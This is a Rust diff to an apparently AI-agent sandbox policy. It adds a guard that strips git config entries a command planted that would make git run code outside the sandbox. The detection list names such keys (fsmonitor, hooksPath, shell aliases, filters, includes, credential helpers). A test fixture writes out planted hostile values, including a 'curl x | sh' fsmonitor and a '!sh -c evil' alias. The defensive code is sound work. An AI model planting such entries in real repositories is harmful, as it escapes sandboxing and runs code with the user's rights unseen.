@@ -1199,24 +1199,18 @@ impl ToolPolicy {
         let mut harness_state_writes = quotable(&state)
             .map(|state| format!("(deny file-write* {state})"))
             .unwrap_or_default();
-        // A repository's hooks and configuration, for the reason
-        // `refuse_if_runs_outside` gives: git runs them later, unconfined.
-        // Only once `.git` exists: `git init` writes both, and a repository
-        // the model creates starts with git's own, not the model's.
-        let git = std::path::Path::new(root).join(".git");
-        if git.is_dir() {
-            for (path, rule) in [
-                (git.join("hooks"), "subpath"),
-                (git.join("config"), "literal"),
-            ] {
-                if let Some(path) = path
-                    .to_str()
-                    .filter(|path| !path.contains('"') && !path.contains('\\'))
-                {
-                    harness_state_writes
-                        .push_str(&format!("(deny file-write* ({rule} \"{path}\"))"));
-                }
-            }
+        // A repository's hooks, for the reason `refuse_if_runs_outside`
+        // gives: git runs them later, unconfined. Only once `.git` exists:
+        // `git init` writes them. Its configuration stays writable -- `git
+        // remote add`, a branch that tracks one -- and what a command adds
+        // to it that git would run is taken out afterwards (`GitConfigGuard`).
+        let hooks = std::path::Path::new(root).join(".git").join("hooks");
+        if hooks.is_dir()
+            && let Some(path) = hooks
+                .to_str()
+                .filter(|path| !path.contains('"') && !path.contains('\\'))
+        {
+            harness_state_writes.push_str(&format!("(deny file-write* (subpath \"{path}\"))"));
         }
         let reads = format!(
             "(deny file-read-data)(allow file-read-data {}){harness_state}",
@@ -4592,6 +4586,7 @@ async fn run_command_once(
         .kill_on_drop(true);
     #[cfg(unix)]
     command.process_group(0);
+    let git_config = GitConfigGuard::take(&policy.root);
     let mut child = command.spawn()?;
     let mut process_group = ProcessGroupGuard::new(child.id());
     if let Some(mut pipe) = child.stdin.take() {
@@ -4626,6 +4621,7 @@ async fn run_command_once(
         }
     };
     process_group.disarm();
+    let removed = git_config.settle();
     let stdout_capture = stdout_task
         .await
         .map_err(|_| ToolError::Io(std::io::Error::other("stdout reader failed")))??;
@@ -4633,7 +4629,14 @@ async fn run_command_once(
         .await
         .map_err(|_| ToolError::Io(std::io::Error::other("stderr reader failed")))??;
     let (stdout, a) = policy.redact(&String::from_utf8_lossy(&stdout_capture.retained));
-    let (stderr, b) = policy.redact(&String::from_utf8_lossy(&stderr_capture.retained));
+    let (mut stderr, b) = policy.redact(&String::from_utf8_lossy(&stderr_capture.retained));
+    if !removed.is_empty() {
+        stderr.push_str(&format!(
+            "\n[PWR] removed from .git/config what this command added that git would run with the \
+             person's rights, outside the sandbox: {}. The rest of the change was kept.",
+            removed.join(", ")
+        ));
+    }
     let artifact_hash = hash_bytes(format!(
         "{}:{}:{:?}",
         stdout_capture.hash,
@@ -4655,6 +4658,137 @@ async fn run_command_once(
         sandboxed,
         failing_files,
     })
+}
+
+/// `.git/config` as it was before a command, to take out afterwards what
+/// the command added that git would run: a `core.fsmonitor`, a hooks path,
+/// an alias that runs a shell, a filter or diff driver, an include... git
+/// runs those for whoever uses it next -- the person, their editor, PWR --
+/// with their rights and no sandbox, and none of it shows in a diff. The
+/// rest of what the command wrote stays: `git remote add`, a branch that
+/// tracks one, a setting.
+struct GitConfigGuard {
+    path: PathBuf,
+    before: Option<String>,
+}
+
+impl GitConfigGuard {
+    fn take(root: &Path) -> Self {
+        let path = root.join(".git").join("config");
+        let before = std::fs::read_to_string(&path).ok();
+        Self { path, before }
+    }
+
+    /// The entries the command added that run something, each removed.
+    fn settle(&self) -> Vec<String> {
+        let Ok(after) = std::fs::read_to_string(&self.path) else {
+            return Vec::new();
+        };
+        if self.before.as_deref() == Some(after.as_str()) {
+            return Vec::new();
+        }
+        let had = git_config_runs_code(self.before.as_deref().unwrap_or_default());
+        let added: Vec<String> = git_config_runs_code(&after)
+            .into_iter()
+            .map(|(_, name)| name)
+            .filter(|name| !had.iter().any(|(_, seen)| seen == name))
+            .collect();
+        if !added.is_empty() {
+            let lines: Vec<usize> = git_config_runs_code(&after)
+                .into_iter()
+                .filter(|(_, name)| added.contains(name))
+                .map(|(line, _)| line)
+                .collect();
+            let kept: String = after
+                .split_inclusive('\n')
+                .enumerate()
+                .map(|(index, line)| {
+                    if !lines.contains(&index) {
+                        return line.to_owned();
+                    }
+                    // `[section] key = value`: the header stays, so the lines
+                    // after it keep their section.
+                    match line
+                        .trim_start()
+                        .strip_prefix('[')
+                        .and_then(|h| h.find(']'))
+                    {
+                        Some(end) => {
+                            let start = line.len() - line.trim_start().len();
+                            format!("{}\n", &line[..start + end + 2])
+                        }
+                        None => String::new(),
+                    }
+                })
+                .collect();
+            let _ = std::fs::write(&self.path, kept);
+        }
+        added
+    }
+}
+
+/// The entries of a git config that make git run something, each with its
+/// line: `section[.subsection].key`, section and key lowercased as git
+/// compares them.
+fn git_config_runs_code(config: &str) -> Vec<(usize, String)> {
+    let mut found = Vec::new();
+    let mut section = String::new();
+    let mut subsection: Option<String> = None;
+    for (index, line) in config.lines().enumerate() {
+        let mut rest = line.trim();
+        if let Some(header) = rest.strip_prefix('[')
+            && let Some(end) = header.find(']')
+        {
+            let inside = header[..end].trim();
+            (section, subsection) = match inside.split_once(char::is_whitespace) {
+                Some((name, sub)) => (
+                    name.to_ascii_lowercase(),
+                    Some(sub.trim().trim_matches('"').to_owned()),
+                ),
+                None => match inside.split_once('.') {
+                    Some((name, sub)) => (name.to_ascii_lowercase(), Some(sub.to_owned())),
+                    None => (inside.to_ascii_lowercase(), None),
+                },
+            };
+            // `[section] key = value` is one line too.
+            rest = header[end + 1..].trim();
+        }
+        if rest.is_empty() || rest.starts_with('#') || rest.starts_with(';') {
+            continue;
+        }
+        let (key, value) = rest.split_once('=').unwrap_or((rest, ""));
+        let key = key.trim().to_ascii_lowercase();
+        let runs = match (section.as_str(), key.as_str()) {
+            (
+                "core",
+                "fsmonitor"
+                | "hookspath"
+                | "sshcommand"
+                | "pager"
+                | "editor"
+                | "askpass"
+                | "gitproxy"
+                | "alternaterefscommand",
+            ) => true,
+            ("sequence", "editor") | ("diff", "external") | ("web", "browser") => true,
+            ("diff", "textconv" | "command") | ("merge", "driver") => subsection.is_some(),
+            ("filter", "clean" | "smudge" | "process") => true,
+            ("alias", _) => value.trim_start().starts_with('!'),
+            ("credential", "helper") | ("include" | "includeif", "path") => true,
+            ("remote", "uploadpack" | "receivepack") | ("uploadpack", "packobjectshook") => true,
+            ("gpg", "program") | ("pager", _) => true,
+            ("browser" | "man" | "difftool" | "mergetool", "cmd" | "path") => true,
+            _ => false,
+        };
+        if runs {
+            let name = match &subsection {
+                Some(sub) => format!("{section}.{sub}.{key}"),
+                None => format!("{section}.{key}"),
+            };
+            found.push((index, name));
+        }
+    }
+    found
 }
 
 struct ProcessGroupGuard {
@@ -5161,6 +5295,60 @@ mod tests {
                 "{path} was refused"
             );
         }
+    }
+
+    #[test]
+    fn a_command_keeps_its_git_settings_but_not_what_git_would_run() {
+        let root = tempfile::tempdir().unwrap();
+        std::fs::create_dir(root.path().join(".git")).unwrap();
+        let config = root.path().join(".git/config");
+        std::fs::write(&config, "[core]\n\tbare = false\n[alias]\n\tst = status\n").unwrap();
+        let guard = GitConfigGuard::take(root.path());
+        // What `git remote add`, `git config` and a planted setting write.
+        std::fs::write(
+            &config,
+            "[core]\n\tbare = false\n\tfsmonitor = sh -c 'curl x | sh'\n[alias]\n\tst = status\n\tco = !sh -c evil\n\
+             [remote \"origin\"]\n\turl = https://example.com/r.git\n[filter \"lfs\"]\n\tsmudge = evil\n\
+             [include]\n\tpath = ../x\n[user] email = a@b.c\n[CORE] HooksPath = /tmp/h\n\tquotepath = false\n",
+        )
+        .unwrap();
+        let mut removed = guard.settle();
+        removed.sort();
+        assert_eq!(
+            removed,
+            [
+                "alias.co",
+                "core.fsmonitor",
+                "core.hookspath",
+                "filter.lfs.smudge",
+                "include.path"
+            ]
+        );
+        let kept = std::fs::read_to_string(&config).unwrap();
+        for wanted in [
+            "url = https://example.com/r.git",
+            "st = status",
+            "bare = false",
+            "email = a@b.c",
+            "[CORE]",
+            "quotepath = false",
+        ] {
+            assert!(kept.contains(wanted), "{wanted} was lost:\n{kept}");
+        }
+        assert!(git_config_runs_code(&kept).is_empty(), "{kept}");
+        // A setting that was there before the command is the person's: kept.
+        let before = GitConfigGuard::take(root.path());
+        std::fs::write(
+            &config,
+            format!("{kept}[credential]\n\thelper = osxkeychain\n"),
+        )
+        .unwrap();
+        let owned = GitConfigGuard::take(root.path());
+        assert_eq!(owned.settle(), Vec::<String>::new());
+        assert!(
+            !before.settle().is_empty(),
+            "added since the first snapshot"
+        );
     }
 
     #[cfg(unix)]
